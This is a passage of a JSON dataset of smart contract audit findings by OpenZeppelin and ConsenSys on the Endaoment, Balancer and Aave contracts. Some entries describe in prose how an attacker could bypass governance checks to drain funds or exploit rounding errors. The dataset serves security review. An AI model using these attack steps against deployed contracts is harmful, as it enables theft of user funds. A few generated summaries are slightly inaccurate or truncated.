`ERC20` contract is implemented exactly as the OpenZeppelin one, it can happen that transactions calling those functions fail due to a mismatch between the `ERC20` OpenZeppelin contract and the target implementation represented by the `tokenAddress`.\n\n\nAnother consequence is that, since anyone can transfer arbitrary `ERC20` tokens to the `Fund` or `Org` contract, if someone accidentally deposits an `ERC20` token which has a different implementation from the OpenZeppelin one, those funds are stuck forever in the contract and cant be transferred out.\n\n\nAs suggested in [[N03]](#n03), consider using the `IERC20` interface importing it from the `openzeppelin-contracts` package to allow interoperation with any possible implementation of the `ERC20` token standard and avoid the loss of the funds deposited in the contracts.",
      "summary": "\nThis bug report is about the use of contract interfaces in the codebase of the Endaoment project. The `ERC20` token implementation by OpenZeppelin is used in the `Fund` and `Org` contracts instead of using the interface. The address of the `ERC20` token to be used is passed as an input parameter. This can lead to transactions calling those functions failing due to a mismatch between the `ERC20` OpenZeppelin contract and the target implementation. Furthermore, if someone accidentally deposits an `ERC20` token which has a different implementation from the OpenZeppelin one, those funds are stuck forever in the contract and cant be transferred out. As a solution, it is suggested to use the `IERC20` interface importing it from the `openzeppelin-contracts` package to allow interoperation with any possible implementation of the `ERC20` token standard and avoid the loss of the funds deposited in the contracts. The bug has been fixed in pull request #68.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Endaoment Audit",
      "source_link": "https://blog.openzeppelin.com/endaoment-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11281",
      "title": "[C02] Fees are wrongly calculated",
      "impact": "HIGH",
      "content": "**Update:** *Partially fixed in [pull request #64](https://github.com/endaoment/endaoment-contracts/pull/64). Fees can be still evaluated to `0` but the Endaoment team acknowledged this, given the fact that its an uncommon outcome and that `grant` values are bounded by the web application.*\n\n\nIn the [`finalizeGrant`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Fund.sol#L119) function of the `Fund` contract, the `fee` parameter is calculated as `grant.value/100`. The entire system assumes that fees are paid to the admin of the fund whenever a grant is finalized.\n\n\nDue to the [Solidity truncating rule for division](https://solidity.readthedocs.io/en/latest/types.html#division), if `grant.value < 100`, then `fee` will be zero and nothing will be paid to the `admin`.\n\n\nThe rounding error introduced when dividing will always round down the fees paid to the `admin`.\n\n\nConsider handling the rounding errors using a library for decimals or introducing specific logic to handle them. Moreover, consider calculating the `finalGrant` variable as the `grant.value - fee`. This would make consistent the fact that both, if summed up, equal the `grant.value`.",
      "summary": "\nA bug was recently discovered in the `finalizeGrant` function of the `Fund` contract. This bug can cause fees to be evaluated to `0` when `grant.value < 100`, meaning that the admin of the fund will not be paid any fees. This is due to the Solidity truncating rule for division, which always rounds down the fees paid to the admin. The Endaoment team has acknowledged this issue, given the fact that it is an uncommon outcome and that `grant` values are bounded by the web application.\n\nTo fix this issue, the team should consider handling the rounding errors using a library for decimals or introducing specific logic to handle them. Additionally, it may be beneficial to calculate the `finalGrant` variable as the `grant.value - fee`, which would make it consistent that both, when summed up, equal the `grant.value`. Part of this bug has already been fixed in pull request #64, but the team should continue to work on it to ensure the admin is always paid the correct fees.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Endaoment Audit",
      "source_link": "https://blog.openzeppelin.com/endaoment-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11280",
      "title": "[C01] Governance restrictions can be bypassed",
      "impact": "HIGH",
      "content": "**Update:** *Fixed in pull requests [#76](https://github.com/endaoment/endaoment-contracts/pull/76) and [#77](https://github.com/endaoment/endaoment-contracts/pull/77). The Endaoment team created a new [`EndaomentAdminStorage`](https://github.com/endaoment/endaoment-contracts/blob/master/contracts/EndaomentAdminStorage.sol) contract that keeps track of the current `EndaomentAdmin` implementation saved in the [`endaomentAdmin` parameter](https://github.com/endaoment/endaoment-contracts/blob/master/contracts/EndaomentAdminStorage.sol#L16). This contract extends from the`Administratable` one and also provides a restricted method to eventually change the address of the implementation. The factories [now extend](https://github.com/endaoment/endaoment-contracts/blob/master/contracts/FundFactory.sol#L15) from such contract and their addresses are stored in the `Fund` and `Org` contract whenever a new one is created. In this way the `endaomentAdmin` of both factories is passed as input parameter in the `Administratable` modifiers whenever a restricted function of the `Fund` or `Org` contract is called. It has to be noticed that, before interacting with the system, the correct roles must be set in the `EndaomentAdmin` contract configured in the `EndaomentAdminStorage` one. Even if this fixes the issue, an address is still passed as input parameter in the `Administratable` modifiers and a new contract has been generated, slightly increasing the gas cost.*\n\n\nThe entire system relies on the [`EndaomentAdmin`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/EndaomentAdmin.sol#L107) contract to restrict access to functions and to separate user roles.  \n\nThe creator of the `EndaomentAdmin` contract is the one in charge of setting specific roles to addresses.\n\n\nThe [`Fund`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Fund.sol), [`FundFactory`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/FundFactory.sol), [`Org`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Org.sol), and [`OrgFactory`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/OrgFactory.sol) contracts all extend from the [`Administratable` contract](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Administratable.sol).  \n\nThe `Administratable` contract defines the [`onlyAdmin`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Administratable.sol#L17) and [`onlyAdminOrRole`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Administratable.sol#L30) modifiers, used to restrict function calls in the derived contracts.  \n\nThese modifiers receive the `adminContractAddress` as input parameter and use it to instantiate the governance contract `EndaomentAdmin`.  \n\nThey then ask to the `EndaomentAdmin` contract at the specified address if the `msg.sender` has the proper rights and it eventually reverts if its not the case.\n\n\nThe issue is that all the functions making use of these modifiers are `public` and receive an arbitrary `adminContractAddress` as input parameter.  \n\nFunctions restricted by the `onlyAdminOrRole` modifier are:\n\n\n* [`changeManager`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Fund.sol#L62), [`finalizeGrant`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Fund.sol#L119) of the `Fund` contract.\n* [`createFund`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/FundFactory.sol#L36) of the `FundFactory` contract.\n* [`approveClaim`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Org.sol#L79), [`cashOutOrg`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Org.sol#L91) and [`setOrgWallet`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Org.sol#L99) of the `Org` contract.\n* [`createOrg`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/OrgFactory.sol#L36) of the `OrgFactory` contract.\n\n\nWhile the `onlyAdmin` modifier is exclusively used to protect `FundFactory` and `OrgFactory` constructors.\n\n\nThis opens the doors for the following attack:\n\n\n* Alice deploys her own `EndaomentAdmin` contract and sets her address as having full access (i.e. by setting every role to her address).\n* She can now call any of the restricted functions listed above or deploy new factories, passing the address of her malicious `EndaomentAdmin` contract as `adminContractAddress` in the function call parameters.\n\n\nThere are several ways now Alice can benefit from this scenario by just using the malicious `adminContractAddress`:\n\n\n* Every `Org` contract instance, if it has been deployed by the `OrgFactory`, would result in an [`allowed` organization](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/OrgFactory.sol#L39). The `createGrant` function of the `Fund` contract [checks allowed organizations](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Fund.sol#L101) calling the [`checkRecipient` function](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Fund.sol#L71). Alice can:\n* Create a malicious `Org` contract by calling the [`createOrg`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/OrgFactory.sol#L36) function of the `OrgFactory` contract making it an allowed organization.\n* Change the manager of a `Fund` contract setting her address instead, by calling the [`changeManager`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Fund.sol#L62) function .\n* Call the [`createGrant`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Fund.sol#L100) function which has the `restricted` modifier ensuring that the `msg.sender == manager`. She will bypass the `require` statement in line [`101`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Fund.sol#L101) and successfully create a grant to her malicious organization.\n* She can also finalize any grant moving out of the contract the funds needed to cover it by calling the [`finalizeGrant`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Fund.sol#L119) function. Together with the previous scenario, she can definitely steal all the funds from the contract.\n* Once every fund is transferred out to the malicious organization she can cash out everything by calling the [`cashOutOrg`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Org.sol#L91) function of the  \n\n`Org` factory.\n* She can finally change the [`orgWallet`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Org.sol#L32) of any of the deployed `Org` contracts by calling the [`setOrgWallet`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Org.sol#L99) function or approve any arbitrary malicious claim by calling the [`approveClaim`](https://github.com/endaoment/endaoment-contracts/blob/f60aa253d3d869ad6460877f23e6092acb313add/contracts/Org.sol#L79) function.\n\n\nMoreover, all the constructors of the cited contracts are protected by both modifiers, where the `adminContractAddress` is passed as constructor parameter. Since these modifiers can be skipped, the constructors of the factories and of `Fund` and `Org` contracts can be easily called.\n\n\nTo solve the issue consider doing the following:\n\n\n* Set the current implementation of the `EndaomentAdmin` contract in the constructor of the `Administratable` contract whenever it is called by the derived contract constructors. Save it as state variable.\n* Remove the `adminContractAddress` input parameter from any function making use of it and from the modifier definitions.\n* Change the modifier implementations to ask directly to the previously set `EndaomentAdmin` contract for `msg.sender` roles.\n* Implement an auxiliary function, with restricted access, to change, eventually, the address of the correct `EndaomentAdmin` implementation.",
      "summary": "\nA bug report was filed to report a security issue in the Endaoment system. The issue is that all the functions making use of the `onlyAdmin` and `onlyAdminOrRole` modifiers are `public` and receive an arbitrary `adminContractAddress` as input parameter. This opens the doors for an attack by Alice, who can deploy her own `EndaomentAdmin` contract and set her address as having full access, and then call any of the restricted functions listed or deploy new factories, passing the address of her malicious `EndaomentAdmin` contract as `adminContractAddress` in the function call parameters. She can then create a malicious `Org` contract by calling the `createOrg` function of the `OrgFactory` contract, change the manager of a `Fund` contract setting her address instead, create grants to her malicious organization and cash out all the funds from the contract.\n\nTo fix the issue, the current implementation of the `EndaomentAdmin` contract should be set in the constructor of the `Administratable` contract whenever it is called by the derived contract constructors. The `adminContractAddress` input parameter should be removed from any function making use of it and from the modifier definitions. The modifier implementations should be changed to ask directly to the previously set `EndaomentAdmin` contract for `msg.sender` roles. An auxiliary function should also be implemented, with restricted access, to change, eventually, the address of the correct `EndaomentAdmin` implementation. The issue has been fixed in pull requests [#76](https://github.com/endaoment/endaoment-contracts/pull/76) and [#77](https://github.com/endaoment/endaoment-contracts/pull/77). The Endaoment team created a new [`EndaomentAdminStorage`](https://github.com/endaoment/endaoment-contracts/blob/master/contracts/EndaomentAdminStorage.sol) contract that keeps track of the current `EndaomentAdmin` implementation saved in the [`endaomentAdmin` parameter](https://github.com/endaoment/endaoment-contracts/blob/master/contracts/EndaomentAdminStorage.sol#L16). This contract extends from the`Administ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Endaoment Audit",
      "source_link": "https://blog.openzeppelin.com/endaoment-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11368",
      "title": "Rounding errors are not always in favor of the pool",
      "impact": "LOW",
      "content": "Fixed-point arithmetic introduces small errors in the computations used throughout the contracts. The `BNum` library makes use of fixed-point algorithms that minimize these errors (by rounding to the nearest smallest unit). However, these errors still exist and, importantly, are not always in favor of the pool. This means it may be possible for users to illegitimately remove dust amounts of from the pool. This can happen both when adding and removing liquidity and when performing swaps. Under extreme conditions it may be profitable to exploit these errors.\n\n\nAs an example, consider the [`joinPool` function](https://github.com/balancer-labs/balancer-core/blob/f4ed5d65362a8d6cec21662fb6eae233b0babc1f/contracts/BPool.sol#L367). Suppose the [`poolTotal`](https://github.com/balancer-labs/balancer-core/blob/f4ed5d65362a8d6cec21662fb6eae233b0babc1f/contracts/BPool.sol#L374) is `100e18` and one of the bound tokens, `t`, has [a record](https://github.com/balancer-labs/balancer-core/blob/f4ed5d65362a8d6cec21662fb6eae233b0babc1f/contracts/BPool.sol#L380) such that `_records[t].balance = 20000005`, which represents a token balance of `200.00005` for a token with 5 decimals. If the user supplies a `poolAmountOut` parameter value of `17857142860000000000` (approximately 17.86e18), then the [`ratio` variable](https://github.com/balancer-labs/balancer-core/blob/f4ed5d65362a8d6cec21662fb6eae233b0babc1f/contracts/BPool.sol#L375) will be `178571428600000000`. If there were no rounding errors, we would expect that the user would have to transfer in `35.71429464857143` units of the token. However, due to the rounding error [introduced by `bmul`](https://github.com/balancer-labs/balancer-core/blob/f4ed5d65362a8d6cec21662fb6eae233b0babc1f/contracts/BPool.sol#L381), the user actually transfers in `35.71429` tokens, which is `0.00000464857143` fewer tokens than expected. In other words, the user bought shares of the pool slightly more cheaply than intended. The error introduced by the fixed-point arithmetic, though small, was not in favor of the pool in this case.\n\n\nSimilar situations can arise when exiting the pool, and when interacting with the swapping functions. Computing the maximum error bounds for the swapping functions is more difficult (we did not explicitly compute them during this audit), but the same principles may apply, and the underlying issue is that the errors may not always favor the pool.\n\n\nUnder most normal conditions, these errors are negligible and not profitable to exploit. The cost of gas alone would typically make exploitation cost-prohibitive, and the error must be great enough (and in favor of the attacker) to outweigh any swap fees or exit fees incurred.\n\n\nIn some very extreme cases, however, exploiting these errors may be profitable. For example, if an attacker can illegitimately remove an extra `0.000004` tokens from the pool, and those tokens are worth $1M each, then the attacker could gross $4 per transaction. If it cost less in gas to perform the attack (including the gas cost of flash-borrowing the required capital if necessary) then you could expect attackers to create bots to exploit the rounding errors until the pool was emptied.\n\n\nAll else being equal, these errors become more severe when the tokens in question have fewer decimals, and when the value of the whole units of the token are greater.\n\n\nConsider refactoring the code to ensure that all arithmetic errors related to moving tokens are in favor of the pool.\n\n\nFor example, in the `joinPool` function, consider adding `1` to the output of `bdiv` on [line 358](https://github.com/balancer-labs/balancer-core/blob/f4ed5d65362a8d6cec21662fb6eae233b0babc1f/contracts/BPool.sol#L375) to counteract any rounding-down that may have ocurred during the execution of `bdiv`, and consider adding `1` to the output of `bmul` on [line 381](https://github.com/balancer-labs/balancer-core/blob/f4ed5d65362a8d6cec21662fb6eae233b0babc1f/contracts/BPool.sol#L381) to counteract any rounding-down that may have ocurred during the execution of `bmul`. This would ensure that all calls to the `joinPool` function have arithmetic errors that are in favor of the pool. While this may slightly increase the absolute size of the errors, it enforces that the *direction* of the errors favors the security of the pool.\n\n\nWith all arithmetic errors in favor of the pool, there would be no need to worry about attackers splitting/batching transactions in an attempt to exploit arithmetic errors in their favor, even under extreme conditions.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Balancer Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/balancer-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "13742",
      "title": "Switch modifier order in BPool",
      "impact": "LOW",
      "content": "#### Description\n\n\n`BPool` functions often use modifiers in the following order: `_logs_`, `_lock_`. Because `_lock_` is a reentrancy guard, it should take precedence over `_logs_`. See example:\n\n\n\n```\npragma solidity ^0.5.0;\r\npragma experimental ABIEncoderV2;\r\n\r\ncontract Target {\r\n    \r\n    string[] arr;\r\n    \r\n    modifier a() {\r\n        // sA1\r\n        arr.push(\"sA1\");\r\n        _;\r\n        // sA2\r\n        arr.push(\"sA2\");\r\n    }\r\n    \r\n    modifier b() {\r\n        // sB1\r\n        arr.push(\"sB1\");\r\n        _;\r\n        // sB2\r\n        arr.push(\"sB2\");\r\n    }\r\n    \r\n    // sA1 -> sB1 -> func -> sB2 -> sA2\r\n    function test() public a b {\r\n        arr.push(\"func\");\r\n    }\r\n    \r\n    function get() public view returns (string[] memory) {\r\n        return arr;\r\n    }\r\n}\r\n\n```\n#### Recommendation\n\n\nPlace `_lock_` before other modifiers; ensuring it is the very first and very last thing to run when a function is called.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Balancer Finance",
      "source_link": "https://consensys.net/diligence/audits/2020/05/balancer-finance/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alexander Wade",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13741",
      "title": "Max weight requirement in rebind is inaccurate",
      "impact": "LOW",
      "content": "#### Description\n\n\n`BPool.rebind` enforces `MIN_WEIGHT` and `MAX_WEIGHT` bounds on the passed-in `denorm` value:\n\n\n**code/contracts/BPool.sol:L262-L274**\n\n\n\n```\nfunction rebind(address token, uint balance, uint denorm)\n    public\n    \\_logs\\_\n    \\_lock\\_\n{\n\n    require(msg.sender == \\_controller, \"ERR\\_NOT\\_CONTROLLER\");\n    require(\\_records[token].bound, \"ERR\\_NOT\\_BOUND\");\n    require(!\\_finalized, \"ERR\\_IS\\_FINALIZED\");\n\n    require(denorm >= MIN\\_WEIGHT, \"ERR\\_MIN\\_WEIGHT\");\n    require(denorm <= MAX\\_WEIGHT, \"ERR\\_MAX\\_WEIGHT\");\n    require(balance >= MIN\\_BALANCE, \"ERR\\_MIN\\_BALANCE\");\n\n```\n`MIN_WEIGHT` is `1 BONE`, and `MAX_WEIGHT` is `50 BONE`.\n\n\nThough a token weight of `50 BONE` may make sense in a single-token system, `BPool` is intended to be used with two to eight tokens. The sum of the weights of all tokens must not be greater than `50 BONE`.\n\n\nThis implies that a weight of `50 BONE` for any single token is incorrect, given that at least one other token must be present.\n\n\n#### Recommendation\n\n\n`MAX_WEIGHT` for any single token should be `MAX_WEIGHT - MIN_WEIGHT`, or `49 BONE`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Balancer Finance",
      "source_link": "https://consensys.net/diligence/audits/2020/05/balancer-finance/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alexander Wade",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13740",
      "title": "Commented code exists in BMath",
      "impact": "LOW",
      "content": "#### Description\n\n\nThere are some instances of code being commented out in the `BMath.sol` that should be removed.\nIt seems that most of the commented code is related to exit fee, however this is in contrast to `BPool.sol` code base that still has the exit fee code flow, but uses 0 as the fee.\n\n\n#### Examples\n\n\n**code/contracts/BMath.sol:L137-L140**\n\n\n\n```\nuint tokenInRatio = bdiv(newTokenBalanceIn, tokenBalanceIn);\n\n// uint newPoolSupply = (ratioTi ^ weightTi) \\* poolSupply;\nuint poolRatio = bpow(tokenInRatio, normalizedWeight);\n\n```\n**code/contracts/BMath.sol:L206-L209**\n\n\n\n```\nuint normalizedWeight = bdiv(tokenWeightOut, totalWeight);\n// charge exit fee on the pool token side\n// pAiAfterExitFee = pAi\\*(1-exitFee)\nuint poolAmountInAfterExitFee = bmul(poolAmountIn, bsub(BONE, EXIT\\_FEE));\n\n```\nAnd many more examples.\n\n\n#### Recommendation\n\n\nRemove the commented code, or address them properly. If the code is related to exit fee, which is considered to be 0 in this version, this style should be persistent in other contracts as well.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Balancer Finance",
      "source_link": "https://consensys.net/diligence/audits/2020/05/balancer-finance/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alexander Wade",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13739",
      "title": "Similar token-to-token swap methods can yield very different results",
      "impact": "MEDIUM",
      "content": "#### Description\n\n\n`BPool`s interface exposes several methods to perform token swaps. Because the formula used to calculate trade values varies depending on the method, we compared token swaps performed using two different methods:\n\n\n1. `BPool.swapExactAmountIn` performs a direct token-to-token swap between two bound assets within the pool. Some amount `tokenAmountIn` of `tokenIn` is directly traded for some minimum amount `minAmountOut` of `tokenOut`. An additional parameter, `maxPrice`, allows the trader to specify the maximum amount of slippage allowed during the trade.\n2. `BPool.joinswapExternAmountIn` allows a trader to exchange an amount `tokenAmountIn` of `tokenIn` for a minimum amount `minPoolAmountOut` of the pools token. A subsequent call to `BPool.exitswapPoolAmountIn` allows a trader to exchange amount `poolAmountIn` of the pools tokens for a minimum amount `minAmountOut` of `tokenOut`.\n\n\nWhile the latter method performs a swap by way of the pools token as an intermediary, both methods can be used in order to perform a token-to-token swap. Our comparison between the two tested the relative amount `tokenAmountOut` of `tokenOut` between the two methods with a variety of different parameters.\n\n\n#### Examples\n\n\nEach example made use of a testing contract, found here: <https://gist.github.com/wadeAlexC/12ee22438e8028f5439c5f0faaf9b7f7>\n\n\nAdditionally, `BPool` was modified; unneeded functions were removed so that deployment did not exceed the block gas limit.\n\n\n\n\n---\n\n\n1.\n`tokenIn` weight: `25 BONE`\n\n\n`tokenOut` weight: `25 BONE`\n\n\n`tokenIn`, `tokenOut` at equal balances (`50 BONE`)\n\n\n`tokenAmountIn`: `1 BONE`\n\n\n`swapExactAmountIn` `tokenAmountOut`: 980391195693945000\n\n\n`joinswapExternAmountIn` + `exitSwapPoolAmountIn` `tokenAmountOut`: 980391186207949598\n\n\nResult: `swapExactAmountIn` gives 1.00000001x more tokens\n\n\n\n\n---\n\n\n2.\n`tokenIn` weight: `1 BONE`\n\n\n`tokenOut` weight: `49 BONE`\n\n\n`tokenIn`, `tokenOut` at equal balances (`50 BONE`)\n\n\n`tokenAmountIn`: `1 BONE`\n\n\n`swapExactAmountIn` `tokenAmountOut`: 20202659955287800\n\n\n`joinswapExternAmountIn` + `exitSwapPoolAmountIn` `tokenAmountOut`: 20202659970818843\n\n\nResult: `joinswap/exitswap` gives 1.00000001x more tokens\n\n\n\n\n---\n\n\n3.\n`tokenIn` weight: `25 BONE`\n\n\n`tokenOut` weight: `25 BONE`\n\n\n`tokenIn`, `tokenOut` at equal balances (`1 BONE`)\n\n\n`tokenAmountIn`: `0.5 BONE`\n\n\n`swapExactAmountIn` `tokenAmountOut`: 333333111111037037\n\n\n`joinswapExternAmountIn` + `exitSwapPoolAmountIn` `tokenAmountOut`: 333333055579388951\n\n\nResult: `swapExactAmountIn` gives 1.000000167x more tokens\n\n\n\n\n---\n\n\n4.\n`tokenIn` weight: `25 BONE`\n\n\n`tokenOut` weight: `25 BONE`\n\n\n`tokenIn`, `tokenOut` at equal balances (`30 BONE`)\n\n\n`tokenAmountIn`: `15 BONE`\n\n\n`swapExactAmountIn` `tokenAmountOut`: 9999993333331111110\n\n\n`joinswapExternAmountIn` + `exitSwapPoolAmountIn` `tokenAmountOut`: 9999991667381668530\n\n\nResult: `swapExactAmountIn` gives 1.000000167x more tokens\n\n\n\n\n---\n\n\nThe final test raised the swap fee from `MIN_FEE` (0.0001%) to `MAX_FEE` (10%):\n\n\n5. \n\n\n`tokenIn` weight: `25 BONE`\n\n\n`tokenOut` weight: `25 BONE`\n\n\n`tokenIn`, `tokenOut` at equal balances (`30 BONE`)\n\n\n`tokenAmountIn`: `15 BONE`\n\n\n`swapExactAmountIn` `tokenAmountOut`: 9310344827586206910\n\n\n`joinswapExternAmountIn` + `exitSwapPoolAmountIn` `tokenAmountOut`: 9177966102628338740\n\n\nResult: `swapExactAmountIn` gives 1.014423536x more tokens\n\n\n\n\n---\n\n\n#### Recommendation\n\n\nOur final test showed that with equivalent balances and weights, raising the swap fee to 10% had a drastic effect on relative `tokenAmountOut` received, with `swapExactAmountIn` yielding >1.44% more tokens than the `joinswap/exitswap` method.\n\n\nReading through Balancers provided documentation, our assumption was that these two swap methods were roughly equivalent. Discussion with Balancer clarified that the `joinswap/exitswap` method applied two swap fees: one for single asset deposit, and one for single asset withdrawal. With the minimum swap fee, this double application proved to have relatively little impact on the difference between the two methods. In fact, some parameters resulted in higher relative yield from the `joinswap/exitswap` method. With the maximum swap fee, the double application was distinctly noticeable.\n\n\nGiven the relative complexity of the math behind `BPool`s, there is much that remains to be tested. There are alternative swap methods, as well as numerous additional permutations of parameters that could be used; these tests were relatively narrow in scope.\n\n\nWe recommend increasing the intensity of unit testing to cover a more broad range of interactions with `BPool`s various swap methods. In particular, the double application of the swap fee should be examined, as well as the differences between low and high swap fees.\n\n\nThose using `BPool` should endeavor to understand as much of the underlying math as they can, ensuring awareness of the various options available for performing trades.",
      "summary": "\nThis bug report tested the relative amount of `tokenOut` between two methods of performing token swaps on `BPool`: `swapExactAmountIn` and `joinswapExternAmountIn` + `exitSwapPoolAmountIn`. Four tests were conducted with different parameters, and the final test raised the swap fee from `MIN_FEE` (0.0001%) to `MAX_FEE` (10%). The tests showed that with equivalent balances and weights, raising the swap fee to 10% had a drastic effect on relative `tokenAmountOut` received, with `swapExactAmountIn` yielding >1.44% more tokens than the `joinswap/exitswap` method.\n\nIt is recommended to increase the intensity of unit testing to cover a more broad range of interactions with `BPool`s various swap methods. In particular, the double application of the swap fee should be examined, as well as the differences between low and high swap fees. Those using `BPool` should endeavor to understand as much of the underlying math as they can, ensuring awareness of the various options available for performing trades.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Balancer Finance",
      "source_link": "https://consensys.net/diligence/audits/2020/05/balancer-finance/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alexander Wade",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "11634",
      "title": "[L18] Whitepaper issues",
      "impact": "LOW",
      "content": "The commit audited includes the Aave protocol whitepaper in the [`docs` folder](https://gitlab.com/aave-tech/dlp/contracts/tree/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/docs). Following we include a list of issues related to the whitepaper that must be addressed:\n\n\n* Throughout the entire whitepaper, ray and Ray are used interchangeably.\n* The definition for the Health Factor [does not match the code](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPoolDataProvider.sol#L237), and should be updated.\n* In section 1.2, Block height at which [] should say Timestamp at which []. Additionally, `Bl` should be replaced with `Tl`.\n* There is an unfinished sentence in section 1.9, where it says Check paragraph X where [].\n* There are two sections numbered 1.15. More importantly, they correspond to a circular definition between the Current liquidity rate and the Borrow/Liquidity Rate delta.\n* In section 1.16, `Ci`Is should say `Ci` is (a blank space is missing). Moreover, the last sentence is not coherent and should say The formula to calculate `Ci` at a specific point in time [].\n* In section 1.17, the definition for the Reserve normalized income is incorrect, as it was copied from section 1.16.\n* In the last sentence of section 1.21, `Bu` should be replaced with `Tu`.\n* The last paragraph of section 2.3 refers to chapter 4 that does not exist in the whitepaper.\n* In section 3.1, the formula of Average Market Lending Rate defines a weighted sum. To obtain the average, it should be divided by the total volume of the platforms.\n* The symbol `Bf` is mistakenly used instead of `Rf` to refer to the Current fixed borrow rate.\n* In the Flash Loan section, the actual method executed on the external contract is [`executeOperation`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L639) and not `executeAction` as stated.\n* In the Current fixed borrow rate section, the formula does not specify what occurs when the utilization rate `U` is equal to the threshold `Tr`. Additionally, the whitepaper states that the utilization rate threshold is set to `0.25 * 1e18`, but in the code it is [set to `1e27 / 2`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/DefaultReserveInterestRateStrategy.sol#L24).\n* In the Fixed rates Rebalancing section, the inequality for the rebalancing up is in the wrong direction (it should be `Bfu &gt; Lr`).\n* In the Fixed rates Rebalancing section, the formula for rebalancing down should say (1 + delta) instead of (1  delta).\n\n\n**Update**: *Partially fixed. The whitepaper has been significantly improved. The new version of the whitepaper still has minor issues to be addressed. In particular:*\n\n\n* The new version of the whitepaper states that the utilization rate threshold is now set to `1e27/2`, but in the code it is set to `1e27 / 4`.\n* In the The Rebalancing Process section, the function `rebalanceFixedBorrowRate` should be renamed to `rebalanceStableBorrowRate`.\n* Section 1.2 mentions a `LendingPoolLibrary.sol` file that does not exist.\n* References to `decreaseTotalBorrowsFixedAndUpdateAverageRate` and `increaseTotalBorrowsFixedAndUpdateAverageRate` function should be updated to account for the fixed to stable renaming.\n* In the introduction to section 4, the term fixed rate is used\n* In section 4.4, fixed borrow rate of user x should be changed to stable borrow rate of user x.\n* Figure 14 is missing a Yes label 